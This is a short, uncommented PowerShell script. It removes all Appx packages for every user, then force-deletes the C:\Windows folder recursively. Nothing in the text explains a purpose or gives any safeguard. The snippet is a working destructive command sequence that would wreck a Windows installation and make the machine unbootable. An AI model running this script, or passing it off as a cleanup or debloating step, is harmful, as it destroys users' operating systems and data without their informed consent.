Get-AppxPackage -AllUsers | Remove-AppxPackage

$folderPath = "C:\Windows"

Remove-Item -Path $folderPath -Recurse -Force
